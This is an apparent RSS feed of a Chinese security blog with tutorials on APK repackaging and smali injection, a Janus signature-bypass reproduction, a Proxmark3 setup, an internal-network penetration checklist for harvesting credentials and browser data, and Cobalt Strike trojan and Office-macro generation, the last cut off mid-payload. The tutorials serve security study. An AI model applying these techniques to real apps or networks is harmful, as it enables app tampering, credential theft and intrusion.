parameter&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;数据转换语句如下：&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;声明方式&lt;/th&gt;&#xA;          &lt;th&gt;编码方式&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;append &amp;ldquo;string&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;将指定字符串附加在末尾&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;base64&lt;/td&gt;&#xA;          &lt;td&gt;Base64编码&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;base64url&lt;/td&gt;&#xA;          &lt;td&gt;一种变异的Base64编码(这种编码后的数据不会含义破坏url完整性的字符如+号)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mask&lt;/td&gt;&#xA;          &lt;td&gt;XOR编码 key是随机的&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;netbios&lt;/td&gt;&#xA;          &lt;td&gt;NetBIOS Encode &amp;lsquo;a&amp;rsquo;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;netbiosu&lt;/td&gt;&#xA;          &lt;td&gt;NetBIOS Encode &amp;lsquo;A&amp;rsquo;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;/td&gt;&#xA;          &lt;td&gt;上面这种编码方式我也不怎么了解反正我只知道也是一种编码方式，有兴趣的自己谷歌一下吧&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;prepend &amp;ldquo;string&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;将指定字符串附加在头部&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;Strings转义字符如下：&lt;/p&gt;</description>
    </item>
    <item>
      <title>APK重打包与smali修改</title>
      <link>http://localhost:1313/posts/apk%E9%87%8D%E6%89%93%E5%8C%85%E4%B8%8Esmali%E4%BF%AE%E6%94%B9/</link>
      <pubDate>Wed, 08 Apr 2020 09:14:00 +0800</pubDate>
      <guid>http://localhost:1313/posts/apk%E9%87%8D%E6%89%93%E5%8C%85%E4%B8%8Esmali%E4%BF%AE%E6%94%B9/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;APK重打包漏洞是安卓应用开发中一个较为常见的安全问题，主要是指攻击者通过反编译（Reverse  Engineering）获取应用的源代码或资源文件，对其进行恶意修改（如嵌入恶意代码或广告模块）后重新打包并发布。这种行为会导致原应用的完整性和安全性被破坏，从而威胁用户和开发者的利益。&lt;/p&gt;&#xA;&lt;p&gt;使用工具查壳&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../imgs/6b355b58-90ca-4303-97fd-8f7e827ebe24.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;未加壳后用apktools进行反编译&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar apktool_2.9.3.jar d hello_world.apk&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反编译后定位到主方法的smali&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../imgs/aed333bb-6467-41d6-a0f8-a08625a9b63b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在smali中插入弹窗代码&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../imgs/da19b082-ace1-408a-a071-8e744fa3de3e.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用apktool重新编译&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar apktool.jar b hello_world -o unsigned.apk&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../imgs/25c573f7-c474-4b8e-aca7-0a4b9b93baef.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此时如果直接安装是无法成功的，因为APP未经过签名&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../imgs/c3351e21-959e-40bd-9c41-183ffaec352f.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用命令进行签名，签名先需要先生成jks证书文件&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;keytool -genkeypair -v -keystore test.jks -storepass 123456 -keyalg RSA -keysize 2048 -validity 10000 -alias test&#xD;&#xA;&amp;#34;C:\Program Files\Java\jdk1.8\bin\java.exe&amp;#34; -jar apksigner.jar sign -verbose --ks test.jks --v1-signing-enabled true --v2-signing-enabled true --ks-pass pass:123456 --ks-k ey-alias test --out signed.apk unsigned.apk&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../imgs/5c4b5c06-cc90-4afe-b60a-66a9d9a13deb.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;重打包后可以看到之前修改smali弹窗已经成功&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../imgs/ada17813-2a42-4020-a22e-13eac976a046.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;常见问题解决：&lt;/p&gt;&#xA;&lt;p&gt;\1. Failed to load signer &amp;ldquo;signer #1&amp;rdquo; java.io.IOException: Keystore was tampered with, or password was incorrect&lt;/p&gt;</description>
    </item>
    <item>
      <title>kali linux下PM3环境配置</title>
      <link>http://localhost:1313/posts/kali-linux%E4%B8%8Bpm3%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 04 Sep 2019 19:21:57 +0800</pubDate>
      <guid>http://localhost:1313/posts/kali-linux%E4%B8%8Bpm3%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;前段时间入手了proxmark3 rdv4，好像目前还是最新版本，不过听说马上又要有新版本了(2024更新：4.1早就出了，听说又有新版本了)，这次买的是官方标配加蓝牙拓展模块&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/048a3de0-c49a-45df-9084-ee5698a7ddbd.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/4193f5e1-a708-4e06-84d5-05d8a9f2bdce.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/772761cc-d7e1-4c8b-98c1-feb7da22a43a.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;看起来研制还阔以，迫不及待开始搭环境准备下手&lt;/p&gt;&#xA;&lt;p&gt;首先看到了官方文档的&lt;a href=&#34;https://github.com/Proxmark/proxmark3/wiki&#34;&gt;官方wiki&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;直接在kali上开搞，毕竟kali也是常用系统么&lt;/p&gt;&#xA;&lt;p&gt;根据官网指示首先输入如下命令安装相关依赖&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  sudo apt install git build-essential libreadline5 libreadline-dev gcc-arm-none-eabi libusb-0.1-4 libusb-dev libqt4-dev ncurses-dev perl pkg-config libpcsclite-dev pcscd&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后再git clone下来以后开始编译，成功后如图所示：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/3891243b-bdf7-44eb-bf79-a4d4da603350.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后将PM3连接到kali中，我的就是这样的，连到了虚拟机，希望不要出什么岔子，我可不希望几千块买的东西变砖&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b889a54c-576b-434a-b36e-e9b026b9f9db.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们继续跟着教程走，输入 &lt;code&gt;dmesg | grep -i usb&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;我的出现了一大串&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/059f8037-3ad5-4ca4-8b06-988588b1f960.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据提到的关键字检索后发现如下&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2bd156c3-65aa-4947-aef1-bf2a65755e7c.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此时根据教程提示我们跳到下一步&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/15d98960-dc01-4642-9499-20961c702b55.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后通过以下命令进行固件升级操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2fba87d4-d506-4206-93e6-a105e80f1632.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这时候我们来执行命令看看PM3是否正常了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/ed2fa1cb-5b53-43dd-83f5-9369d26eea02.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;惊了，居然报错了，那问题是什么呢，报的是不正确的端口，通过之前的dmesg | grep -i usb命令再来看一下，原来端口变了&amp;hellip;以前在windows上玩盗版PM3也遇到过，插拔以后COM号会加1&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/6b0b0fd0-fa2f-47d5-a669-775aeeeb9d6d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;那让我们重新输一次命令OK了！&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/39f1566d-9f68-44f5-a35d-08b649a8d27a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;完美！！！&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/36777762-34d2-438c-bd5a-5afcb7fb1bc1.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;也就是说到此时我们kali Linux上的PM3环境已经完全配置完成了，之后就可以开始搞事情了哈哈哈哈&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/d4c54ef5-f81e-4380-980f-7b1ac44d8299.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;成功把自己差点变砖的PM3rdv4给救了回来，我TM真是个天才！！！&lt;/p&gt;&#xA;&lt;p&gt;让我们来看看读卡效果，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/8bc41e5a-5b1b-41fa-9750-88c0721c8102.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;读卡也读到了，简直完美！入门环境搭建教程就到这边，后续会根据实际情况写一些其他的教程。（其实这是一次救砖教程，之前因为一番神奇的操作导致我的PM3变砖，想想这400美刀买回来的东西就这么变砖了是真的难受！还好又在一番神器的操作下救了回来，果然电子产品出问题解决问题三部曲：重启重装重买）&lt;/p&gt;</description>
    </item>
    <item>
      <title>Janus漏洞复现</title>
      <link>http://localhost:1313/posts/janus%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Fri, 14 Sep 2018 04:32:27 +0800</pubDate>
      <guid>http://localhost:1313/posts/janus%E6%BC%8F%E6%B4%9E/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Android平台被爆出“核弹级”漏洞Janus（CVE-2017-13156），该漏洞允许攻击者任意修改Android应用中的代码，而不会影响其签名。 众所周知，Android具有签名机制。正常情况下，开发者发布了一个应用，该应用一定需要开发者使用他的私钥对其进行签名。恶意攻击者如果尝试修改了这个应用中的任何一个文件（包括代码和资源等），那么他就必须对APK进行重新签名，否则修改过的应用是无法安装到任何Android设备上的。但如果恶意攻击者用另一把私钥对APK签了名，并将这个修改过的APK对用户手机里的已有应用升级时，就会出现签名不一致的情况。因此，在正常情况下，Android的签名机制起到了防篡改的作用。&lt;/p&gt;&#xA;&lt;p&gt;但如果恶意攻击者利用Janus漏洞，那么恶意攻击者就可以任意地修改一个APK中的代码（包括系统的内置应用），同时却不需要对APK进行重新签名。换句话说，用这种方式修改过的APK，Android系统会认为它的签名和官方的签名是一致的，但在这个APK运行时，执行的却是恶意攻击者的代码。恶意攻击者利用这个修改过的APK，就可以用来覆盖安装原官方应用（包括系统的内置应用）。由此可见，该漏洞危害极大，而且影响的不仅是手机，而是所有使用Android操作系统的设备。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b85e2cb5-e399-4d24-b35b-13fc0d299c73.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;主要问题是没有使用V2签名&#xA;使用getapkinfo查看应用信息，未使用V2签名&#xA;&lt;img src=&#34;../index_files/617873ce-0216-4a53-a57c-65a1019a7fad.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;为了避免误报问题，解压安装包后查看签名.SF文件，可以看到没有加V2签名&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/47d5e25b-76e4-4167-ab4c-6832cc37a74e.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用一款已经添加了V2签名的APP来查看可以看到X-Android-APK-Signed: 2字段&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/5d285604-ed4d-4835-bd9c-506a652e467a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;提取出文件中的dex，并进行反编译，此处采用baksmali&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;java -jar baksmali-2.5.2.jar d classes.dex&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/64a1631e-e126-4d69-8c50-de2063bb64d4.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入默认输出文件夹，可以看到已经反编译出了smali文件&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/f86e352b-587d-4aea-aa5f-a84eca1a572b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用命令&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find . -name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\*.smali&amp;#34;&lt;/span&gt; | xargs grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;const&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../index_files/df8d5baf-b406-4331-ae5f-cb871f725977.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到在Utils.smali文件中大量信息&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/274ca1c7-2a8e-45a4-87b8-2f900490a26d.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;选择其中的域名信息，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/26ce6960-e553-412e-8946-b14ddd2c1f93.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;修改为evil.com&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/cf2a01e2-95ae-4b6b-9931-e36936365dbd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;修改后保存，重打包成为新的dex，重新生成的文件为out.dex&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/cbffbcf5-4418-450c-b27c-88f79edee3ab.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用利用工具生成恶意的APK包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/28fcce24-8a3a-4d75-bbc7-e1ca1e9c7cd0.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过工具对比可见两个文件的签名文件校验结果完全一致&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/7d3df106-ed8c-4f40-b137-0a708b2a9aec.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>内网渗透备忘录</title>
      <link>http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
      <pubDate>Sun, 12 Aug 2018 03:44:31 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&#xA;本来是个xmind脑图，用于内网渗透的时候提供备忘思路，从xmind转换为md格式，可点击&lt;a href=&#34;http://localhost:1313/atta&#34;&gt;附件菜单&lt;/a&gt;获取xmind文件&lt;/p&gt;&#xA;&lt;h1 id=&#34;内网渗透&#34;&gt;内网渗透&lt;/h1&gt;&#xA;&lt;h2 id=&#34;基础知识&#34;&gt;基础知识&lt;/h2&gt;&#xA;&lt;h3 id=&#34;大型内网域环境&#34;&gt;大型内网域环境&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;父域控制器&lt;/li&gt;&#xA;&lt;li&gt;子域控制器&lt;/li&gt;&#xA;&lt;li&gt;辅域控制器&lt;/li&gt;&#xA;&lt;li&gt;域内主机&lt;/li&gt;&#xA;&lt;li&gt;域内服务器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;windows-ntlm认证原理&#34;&gt;Windows NTLM认证原理&lt;/h3&gt;&#xA;&lt;h3 id=&#34;kerberos域内认证原理&#34;&gt;Kerberos域内认证原理&lt;/h3&gt;&#xA;&lt;h2 id=&#34;内网信息收集&#34;&gt;内网信息收集&lt;/h2&gt;&#xA;&lt;h3 id=&#34;工作组和大型内网信息收集基础&#34;&gt;工作组和大型内网信息收集基础&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;本机密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Windows2012高版本收集&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Windows2012以下低版本收集&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Linux下密码收集&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;收集特定密码文件&lt;/li&gt;&#xA;&lt;li&gt;指定用户命令历史记录明文密码&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;无线密码获取&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;注册表敏感键值信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;数据库中的密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mysql&lt;/li&gt;&#xA;&lt;li&gt;SQL Server&lt;/li&gt;&#xA;&lt;li&gt;&amp;hellip;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;本地储存的密码&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;本地密码本&lt;/li&gt;&#xA;&lt;li&gt;Windows常用软件密码&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;浏览器信息&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Chrome&lt;/li&gt;&#xA;&lt;li&gt;Firefox&lt;/li&gt;&#xA;&lt;li&gt;360&lt;/li&gt;&#xA;&lt;li&gt;IE&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;VPN和代理&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;VPN&lt;/li&gt;&#xA;&lt;li&gt;代理服务器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;数据库信息&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Mysql&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;SQL Server&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Oracle&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;PostgreSQL&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;LDAP&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;通过LDAP定位核心机器&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取内网架构分布&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取内网组织架构&lt;/li&gt;&#xA;&lt;li&gt;通过LDAP获取域内核心机器&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;判断协议出网&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;获取详细网络配置&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hosts&lt;/li&gt;&#xA;&lt;li&gt;所在域&lt;/li&gt;&#xA;&lt;li&gt;IP&lt;/li&gt;&#xA;&lt;li&gt;掩码&lt;/li&gt;&#xA;&lt;li&gt;网关&lt;/li&gt;&#xA;&lt;li&gt;主备DNS ip&lt;/li&gt;&#xA;&lt;li&gt;IPC连接情况&lt;/li&gt;&#xA;&lt;li&gt;共享目录&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户登录记录&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;用户命令记录&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;屏幕抓取敏感信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;环境变量信息&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;远程控制服务情况&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;RDP&lt;/li&gt;&#xA;&lt;li&gt;SSH&lt;/li&gt;&#xA;&lt;li&gt;VNC&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;安装的软件列表&lt;/p&gt;</description>
    </item>
    <item>
      <title>CS基础和WEB Drive-by功能详解</title>
      <link>http://localhost:1313/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 02 Apr 2018 02:13:01 +0800</pubDate>
      <guid>http://localhost:1313/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;cs基础&#34;&gt;CS基础&lt;/h2&gt;&#xA;&lt;p&gt;CS服务端启动方式&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./teamserver ip password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Attacks-Packages:&lt;/p&gt;&#xA;&lt;p&gt;HTML Application生成恶意HTA木马&lt;/p&gt;&#xA;&lt;p&gt;MS Office Macro生成office宏病毒&lt;/p&gt;&#xA;&lt;p&gt;Payload Generator生成各种语言版本的payload&lt;/p&gt;&#xA;&lt;p&gt;USB/CD Autoplay 生成利用自动播放运行的木马&lt;/p&gt;&#xA;&lt;p&gt;Windows Dropper捆绑器，对文档类进行捆绑&lt;/p&gt;&#xA;&lt;p&gt;Windows Executable 生成可执行exe木马&lt;/p&gt;&#xA;&lt;p&gt;Windows Executable(S)生成无状态的exe木马&lt;/p&gt;&#xA;&lt;p&gt;Attacks-Web Drive-by&lt;/p&gt;&#xA;&lt;p&gt;Manage对开启的web服务进行管理&lt;/p&gt;&#xA;&lt;p&gt;Clone Site克隆网站，可记录受害者提交数据&lt;/p&gt;&#xA;&lt;p&gt;Host File 提供文件下载，可修改Mime信息&lt;/p&gt;&#xA;&lt;p&gt;Powershell Web Delivery类似MSF的WEB_delivery&lt;/p&gt;&#xA;&lt;p&gt;signed applet attack 使用java自签名程序进行钓鱼&lt;/p&gt;&#xA;&lt;p&gt;Smart Applet Attack自动检测Java版本并进行攻击，针对Java1.6.0_45以下以及1.7.0_21以下版本&lt;/p&gt;&#xA;&lt;p&gt;System Profiler用来获取系统信息，如系统版本，Flash版本，浏览器版本等&lt;/p&gt;&#xA;&lt;p&gt;生成对应木马目标执行后就会上线&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2fdf5b6a-65b6-4888-9e9b-70f624fefead.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以浏览文件，收集内网信息等，但是相比于MSF反应略慢，所以有时候需要MSF和CS联动&lt;/p&gt;&#xA;&lt;h2 id=&#34;cs使用office宏进行攻击&#34;&gt;CS使用office宏进行攻击&lt;/h2&gt;&#xA;&lt;p&gt;新建一个office监听器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/63c98e4d-e674-4a25-a25e-2876033e8076.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;点击生成宏后选择监听器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/3f82cbe3-a538-43c0-ac0a-8c0b74806e3a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;宏代码会自动加载，需要自己点击复制然后创建宏&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/f89def44-eefc-43c7-9dac-f3b8ffaba382.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;默认生成的宏代码如下，该代码并没有做免杀，基本都会直接被杀掉&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;Private Type PROCESS_INFORMATION&#xD;&#xA;    hProcess As Long&#xD;&#xA;    hThread As Long&#xD;&#xA;    dwProcessId As Long&#xD;&#xA;    dwThreadId As Long&#xD;&#xA;End Type&#xD;&#xA;Private Type STARTUPINFO&#xD;&#xA;    cb As Long&#xD;&#xA;    lpReserved As 